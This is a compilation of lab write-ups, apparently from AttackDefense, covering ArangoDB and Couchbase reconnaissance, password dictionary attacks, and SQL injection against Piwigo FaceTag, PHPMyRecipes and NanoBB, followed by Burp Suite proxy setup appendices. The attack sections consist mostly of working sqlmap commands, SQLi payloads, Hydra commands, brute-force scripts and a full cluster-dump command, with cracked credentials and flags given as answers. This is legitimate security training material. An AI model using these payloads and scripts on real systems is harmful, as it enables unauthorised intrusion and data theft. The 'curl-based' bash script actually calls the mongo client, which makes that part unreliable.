provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Find the port number on which ArangoDB is running? 
 
Answer: ​8529 
 
Command: ​nmap -sV -p- 192.171.16.3 
 
 
 
Q2. How many HTTP methods are allowed by the server? List the method names. 
 
 
 
 
 
Answer:  
7 
DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT 
 
Command:​ nmap --script banner -sV -p 8529 192.171.16.3 
 
 
 
 
Q3. Find the version of ArangoDB server using REST API. 
 
Answer: ​3.4.0 
 
Command:​ curl -X GET http://192.171.16.3:8529/_api/version | jq '.' 
 
 
 
Q4. How many database users are present on the ArangoDB server? Check using REST 
API. 
 
Answer: ​7 
 
Command: ​curl -X GET http://192.171.16.3:8529/_api/user |  jq '.' 
 
 
 
 
 
Q5. Find the number of inserted documents using ArangoSH. 
 
Answer: ​21 
 
Solution: 
 
Connecting to remote server with arangosh and retrieve collections.  
 
Command: ​arangosh --server.endpoint tcp://192.171.16.3:8529 
Enter random string as password 
 
 
 
 
Command: ​db._collections(); 
 
 
 
Q6. List the personal details about "Guilbert" on the ArangoDB server. 
 
Answer: 
Id: 63 
First Name: Guilbert 
Last Name: Tadgell 
Email: gtadgell1q@ehow.com 
City: Duanjia 
Gender: Male 
IP Address: 92.190.194.200 
Credit Card Number: 3553423293783535 
Credit Card Type: jcb 
 
 
 
 
Command: ​db._query('FOR user IN employee FILTER user.first_name == "Guilbert" RETURN 
user').toArray() 
 
 
 
Q7. How many entries of users are present in the employee document? 
 
Answer: ​866 
 
Command: ​db.employee.count(); 
 
 
 
 
References: 
 
1.
ArangoDB (​https://www.arangodb.com/​) 
 
2.
arangosh (​https://www.arangodb.com/docs/2.8/arangosh.html​)  
 
 
 
Name 
ArangoDB Recon: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=547  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Check whether ArangoDB has authentication enabled or not? 
 
Answer: ​Enabled 
 
Command: ​curl -X GET http://192.255.251.3:8529/_api/version 
 
 
 
Q2. Find the credentials required to login to ArangoDB". Use Hydra tool with username 
root and password dictionary: /usr/share/wordlists/metasploit/unix_passwords.txt. 
 
Answer: ​root:arcsight 
 
Command:​ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
-s 8529 -f 192.255.251.3 http-get /_api/version 
 
 
 
Q3. Find the flag from the "secret" document. 
 
Answer: ​1bb5d753c2edd5bae269563a5ec6d0fe 
 
Commands:  
arangosh --server.endpoint tcp://192.255.251.3:8529 
Enter password “arcsight” 
db._query("FOR b IN secret RETURN b").toArray(); 
 
 
 
 
References: 
 
1.
ArangoDB (​https://www.arangodb.com/​) 
 
2.
THC Hydra (​https://tools.kali.org/password-attacks/hydra​)  
3.
ArangoDB HTTP API (​https://www.arangodb.com/docs/3.4/http/​)  
4.
arangosh (​https://www.arangodb.com/docs/2.8/arangosh.html​)  
 
 
 
Name 
Couchbase Recon: Basics I 
URL 
https://www.attackdefense.com/challengedetails?cid=548  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. Is couchbase is running on the target server? 
 
Answer:​ Yes  
 
Solution: 
 
Command: ​nmap -p 8091-8095 192.16.131.3  
 
 
 
As port 8091, 8092 and 8093 are open, there is a strong change that couchbase is running. 
 
Accessing UI to verifying that couchbase is running. 
 
Command: ​curl 192.16.131.3:8091 
 
 
 
Opening the URL obtained after 301 redirect in browsh. 
 
Command: ​browsh --startup-url 192.16.131.3:8091/ui/index.html 
 
 
 
 
Q2. What is the version of the couchbase server? 
 
Answer:​ 6.0.0-1693-community 
 
Command:​ curl 192.16.131.3:8092 
 
 
 
Q3. What is the name of the target cluster? 
 
Answer:​ main-cluster 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8091/pools/nodes 
 
 
 
Q4. What is the UUID of the default pool? 
 
Answer:​ a377a36b5acc342ff6c052cf63ebe244 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8091/pools/ 
 
 
 
Q5. How many nodes are operating on the target cluster? 
 
Answer:​ 1 
 
Solution: 
 
Key “thisNode” only comes once for each node: 
 
Command: ​curl -s -u Administrator:diamonds http://192.16.131.3:8091/pools/nodes | python -m 
json.tool 
 
 
 
 
 
 
 
 
Finding total number of nodes by counting “thisNode” key: 
 
Command: ​curl -s -u Administrator:diamonds http://192.16.131.3:8091/pools/nodes | grep -o -o 
"thisNode" | wc -l 
 
 
 
Q6. How many buckets are present on the couchbase server?  
 
Answer:​ 4 
 
Solution:  
 
Key ​“​bucketType” only comes once for each bucket. 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8091/pools/default/buckets 
 
 
 
Finding total number of buckets by counting “bucketType” key 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8091/pools/default/buckets | 
grep -o "bucketType" | wc -l 
 
 
 
Q7. What command can be used to check stats for beer-sample bucket. 
 
Command:​ curl -u Administrator:diamonds 
http://192.16.131.3:8091/pools/default/buckets/beer-sample/stats 
 
 
 
Q8. What command can be used to delete the free bucket (name of the bucket is free). 
 
Command:​ curl -X DELETE -u Administrator:diamonds 
http://192.16.131.3:8091/pools/default/buckets/free 
 
 
 
We can confirm the number of buckets after deleting it. 
 
Q9. Find the total number of records in beer-sample bucket.  
 
Answer:​ 7303 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8093/query/service -d 
'statement=SELECT count(*) FROM `beer-sample`' 
 
 
 
Q10. What command to be used to only view first 5 records from the beer-sample 
bucket? 
 
Command: ​curl -u Administrator:diamonds http://192.16.131.3:8093/query/service -d 
'statement=SELECT * FROM `beer-sample` limit 5' 
 
 
 
Q11.​ ​Find the total number of records in beer-sample bucket for which city is San 
Francisco.  
 
Answer:​ 10 
 
Command:​ curl -u Administrator:diamonds http://192.16.131.3:8093/query/service -d 
'statement=SELECT count(*) FROM `beer-sample` where city = "San Francisco" ' 
 
 
 
 
References: 
 
1.
Couchbase (​https://www.couchbase.com/​)  
2.
Couchbase Rest API Endpoint List 
(​https://docs.couchbase.com/server/current/rest-api/rest-endpoints-all.html​)  
 
 
 
Name 
Couchbase Recon: Basics II 
URL 
https://www.attackdefense.com/challengedetails?cid=549  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. What is the version of the N1SQL running on the server? Use cbq tool. 
 
Answer: ​2.0.0-N1QL 
 
Solution:  
 
Connecting to remote server with cbq 
 
Command: ​cbq -e ​http://Administrator:diamonds@192.42.21.3:8093 
 
 
 
Finding version information 
 
Command:​ select version(); 
 
 
 
 
 
 
 
 
Q2. How many records are present in travel-sample bucket? Use cbq tool. 
 
Answer: ​31591 
 
Commands:  
cbq -e http://Administrator:diamonds@192.42.21.3:8093 
select count(*) from `travel-sample`; 
 
 
 
Q3. Which country the callsign "AIRLINAIR" belongs to? Use cbq tool. 
 
Answer: ​France 
 
Commands: 
cbq -e http://Administrator:diamonds@192.42.21.3:8093 
select * from `travel-sample` where callsign = "AIRLINAIR"; 
 
 
  
Q4. How many records contain Helicopter in the name? Use cbq tool. 
 
Answer: ​3 
 
Commands: 
cbq -e http://Administrator:diamonds@192.42.21.3:8093 
select count(*) from `travel-sample` where name like "%Helicopter%" ; 
 
 
 
 
 
 
 
 
 
 
Q5. What command can get the list of all buckets present on the target server. Use 
couchbase-cli. 
 
Commands: 
cd /opt/couchbase/bin 
./couchbase-cli bucket-list -c 192.42.21.3:8091 --username Administrator  --password diamonds 
 
 
 
 
Q6. What command can get the list of all servers present on the target cluster. Use 
couchbase-cli. 
 
Commands: 
cd /opt/couchbase/bin 
./couchbase-cli server-list -c 192.42.21.3:8091 --username Administrator  --password diamonds 
 
 
 
Q7. What command can download all data of the target cluster to attacker machine? The 
utility binary for this task comes with the couchbase. 
 
Commands: 
cd /opt/couchbase/bin 
./cbbackup -u Administrator -p diamonds couchbase://192.42.21.3:8091 /backup 
 
 
 
 
 
 
 
Q8. Write python code to fetch first 5 records from travel-sample bucket. Couchbase 
python client is installed on the system. 
 
Code: 
 
import couchbase.subdocument as SD 
from couchbase.cluster import Cluster, PasswordAuthenticator 
 
cluster = Cluster('couchbase://192.42.21.3:8091') 
 
cluster.authenticate(PasswordAuthenticator('Administrator', 'diamonds')) 
 
bucket = cluster.open_bucket('travel-sample') 
 
result = cluster.n1ql_query('SELECT * from `travel-sample` limit 5') 
 
for row in result: 
    print row 
 
 
 
Command: ​python code.py 
 
 
 
 
 
References: 
 
1.
Couchbase (​https://www.couchbase.com/​)  
2.
Couchbase CLI Tools (​https://docs.couchbase.com/server/current/cli/cli-intro.html​)  
3.
Couchbase Python Client (​https://pypi.org/project/couchbase/​) 
 
 
 
 
Name 
Couchbase Recon: Dictionary Attack 
URL 
https://www.attackdefense.com/challengedetails?cid=550  
Type 
Network Recon : NoSQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. ​What is the correct password for user ‘Administrator’? Write a curl based script to 
perform dictionary attack. 
 
Answer: ​sweetness 
 
Solution:  
 
Custom Script: 
 
#!/bin/bash 
while read F ; do 
echo "Trying "$F 
nohup mongo  -u $1 -p $F --authenticationDatabase $2 -host $3 > nohup.out 2>/dev/null & 
sleep .5 
count=$(cat nohup.out| grep "Authentication failed" |wc -l) 
if [[ $count -eq 0 ]] 
then 
 
echo "Possible Password: "$F 
 
break 
fi 
done < $4 
 
 
 
 
 
 
 
 
Commands: 
chmod +x break.sh 
./break.sh  192.128.143.3 Administrator /root/wordlists/100-common-passwords.txt 
 
 
 
 
 
 
 
Q2. What is the correct password for user ‘admin’? Write a python script using 
couchbase python client to perform dictionary attack. Also, beer-sample bucket is 
present on the target. 
 
Answer: ​barbara 
 
Solution:  
 
Custom Script: 
 
import sys 
import couchbase.subdocument as SD 
from couchbase.cluster import Cluster, PasswordAuthenticator 
found = False 
cluster = Cluster('couchbase://192.128.143.3:8091') 
with open("/root/wordlists/100-common-passwords.txt", "r") as ins: 
    for line in ins: 
        line = line.rstrip("\n\r") 
        print "Trying: "+line 
        cluster.authenticate(PasswordAuthenticator('admin', line)) 
        try: 
             cluster.open_bucket('beer-sample') 
             print "Password found: "+line 
             found = True 
             break 
        except: 
             continue 
if not found: 
     print "No Password found!!" 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Command: ​python break.py 
 
 
 
 
 
 
Q3. Perform dictionary attack for user “admin” again. But, this time use hydra tool. State 
the command. 
 
Answer:​ barbara 
 
Command: ​hydra -l admin -P wordlists/100-common-passwords.txt -s 8091 192.128.143.3 
http-get /pools/ 
 
 
 
 
References: 
 
1.
Couchbase (​https://www.couchbase.com/​)  
2.
Couchbase Python Client (​https://pypi.org/project/couchbase/​)  
3.
THC Hydra (​https://tools.kali.org/password-attacks/hydra​) 
 
 
 
 
Name 
Piwigo FaceTag Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=32  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Piwigo FaceTag Plugin sql injection” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the 
vulnerable web page.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/42094 
 
 
 
 
Step 3: ​The “imageId” parameter of “ws.php” is vulnerable to SQL injection. Intercept the POST 
request sent to “ws.php” with burp suite. 
 
Click on the photo under “test” category. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the image.  
 
 
 
 
 
 
 
 
 
Select  “Tag a face” option from the image toolbar. Click on the image, insert some text and 
intercept the request with burp suite. 
 
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
Intercepted Request: 
 
 
 
 
 
 
 
 
 
 
 
 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Step 4: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  imageId 
 
Command: ​sqlmap -r request -p imageId 
 
Enter the following answers when asked for questions. 
 
“C” for “how do you want to proceed?” 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
Payloads: 
 
Type: ​boolean-based blind 
Payload: ​id=-1&imageId=(SELECT (CASE WHEN (1657=1657) THEN 1657 ELSE 
1657*(SELECT 1657 FROM INFORMATION_SCHEMA.PLUGINS) 
END))&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=0&height=0 
 
Type: ​error-based 
Payload: ​id=-1&imageId=2 AND (SELECT 1681 FROM(SELECT 
COUNT(*),CONCAT(0x71786a6a71,(SELECT 
(ELT(1681=1681,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY 
x)a)&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=0&height=0 
 
Type: ​AND/OR time-based blind 
Payload: ​id=-1&imageId=2 AND 
SLEEP(5)&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=0&heig
ht=0 
 
Step 5: ​Send the intercepted request to Repeater. 
 
Payload:  
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
Repeater Tab: 
 
 
 
Step 6: ​Inject the error based SQLI payload in POST data of the request and exploit the 
vulnerability. 
 
Before: 
id=-1&imageId=2&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=
0&height=0 
 
After:  
id=-1&imageId=2 AND (SELECT 1681 FROM(SELECT 
COUNT(*),CONCAT(0x71786a6a71,(SELECT 
(ELT(1681=1681,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY 
x)a)&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=0&height=0 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
The injected SQLI payload was executed. 
 
Step 7: ​Modify the payload used in previous step and retrieve the MySQL server version 
information.  
 
Before:  
id=-1&imageId=2 AND (SELECT 1681 FROM(SELECT 
COUNT(*),CONCAT(0x71786a6a71,(SELECT 
(ELT(1681=1681,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY 
x)a)&name=Test&top=0.13573032336288623&left=0.6593749884403113&width=0&height=0 
 
After:  
title=employer WHERE 4088=4088 AND (SELECT 5499 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(5499=5499,1))),0x716b707671,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- 
oemo&firstname=Test&middlename=test&lastname=test&address=test&city=test&user=test&us
er_password=test&user_password2=test&email=test@gmail.com&Submit=Register 
 
 
 
Request section in the Repeater tab: 
 
 
Response section in the Repeater tab: 
 
 
 
MySQL server version information is revealed.  
 
 
References:  
 
1.
facetag (​http://piwigo.org/ext/extension_view.php?eid=845​) 
 
2.
Piwigo Plugin Facetag 0.0.3 - SQL Injection (​https://www.exploit-db.com/exploits/42094​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
PHPMyRecipes 
URL 
https://www.attackdefense.com/challengedetails?cid=253  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
 
 
 
Step 2: ​Search on google “PHPMyRecipes sql injection” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains a python script which can be used to exploit the SQL Injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/35365 
 
 
 
 
 
 
 
 
Step 3: ​Find the SQL Injection payload using sqlmap. 
 
Analysis of the python script reveals that the “words_exact” parameter sent in POST request to 
the web page “dosearch.php” webpage is vulnerable.  
 
Vulnerable web page​: /dosearch.php 
 
Vulnerable parameter: ​words_exact 
 
Command: ​sqlmap -u 
"http://xcsokyoocmginvr24rsewa6py.public1.attackdefenselabs.com/dosearch.php" --data 
"words_exact=" -p words_exact --method POST 
 
Enter the following answer when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMses?”  
“y” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?”  
“n” for “Do you want to keep testing the others (if any) ?” 
 
 
 
 
 
 
 
 
 
 
 
 
 
Payloads: 
 
Type: ​Error Based  
Payload:​ words_exact=' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM 
(SELECT CONCAT(0x7178626a71,(SELECT (ELT(1595=1595,1))),0x7178707071,0x78))s), 
8446744073709551610, 8446744073709551610)))# 
 
Type:​ AND/OR time-based blind  
Payload: ​words_exact=' IN BOOLEAN MODE) OR (SELECT * FROM 
(SELECT(SLEEP(5)))olpT)# 
 
Type: ​Union Query 
Payload:​ words_exact=' IN BOOLEAN MODE) UNION ALL SELECT 
CONCAT(0x7178626a71,0x6574657668654558444f4a666a4b514b637179786e7841777a7042
696554625943694d4c70556150,0x7178707071),NULL# 
 
Step 4: ​Navigate to Search tab and remove the character length restriction from the “with exact 
phrase” text field 
 
Click on the “Search” tab on the left panel 
 
 
 
 
 
By default in the “with exact phrase” text field only 80 characters can be entered. Since the 
payload is larger than 80 characters, modify the html tag to remove the restriction. 
 
Right click on the “with exact phrase” text field and click on inspect element.  
 
 
 
Click on “maxlength” attribute of the input tag and hit delete key. 
 
 
 
 
 
 
 
 
 
 
 
 
Before:  
 
 
 
After:  
 
 
 
 
Step 5: ​Inject the Error based payload in the “with exact phrase” text field and exploit the SQL 
injection vulnerability.  
 
Payload:  ​'and(select 1 from(select count(*),concat((select version() from 
information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by 
x)a)and' 
 
 
 
 
 
 
Click on the Search button. 
 
 
 
The injected SQL query was executed.  
 
 
 
 
 
Step 6: ​Modify the payload and retrieve the MySQL server version information. 
 
Repeat Step 4 first.  
 
Modify the payload used in step 5 to dump the MySQL server version. 
 
Modified Payload: ​' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT 
CONCAT(0x7178626a71,(SELECT (ELT(1595=1595,1))),0x7178707071,version()))s), 
8446744073709551610, 8446744073709551610)))# 
 
 
 
The MySQL Server version is revealed.  
 
References:  
 
1.
PHPMyRecipes (​http://php-myrecipes.sourceforge.net/​)  
2.
PHPMyRecipes 1.2.2 - 'dosearch.php?words_exact' SQL Injection 
(​https://www.exploit-db.com/exploits/35365​)  
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
Name 
NanoBB 
URL 
https://www.attackdefense.com/challengedetails?cid=254  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
 
Step 2: ​Search on google “NanoBB sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/26126 
 
 
 
 
 
 
Step 3: ​Use the URL containing the SQL injection payload provided at exploit db link to exploit 
the vulnerability.  
 
URL: 
http://e3kuhi3bl6wqnkiaddmybee8m.public2.attackdefenselabs.com/category.php?id=9%20and
%201%20div%202%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%
29,0x3a3a,version%28%29%29,3 
 
 
 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
NanoBB (​https://sourceforge.net/projects/nanobb/​)  
2.
NanoBB 0.7 - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/26126​)  
 
 
 
 
 
Name 
Joomla Simple Calendar Component 
URL 
https://www.attackdefense.com/challengedetails?cid=255  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
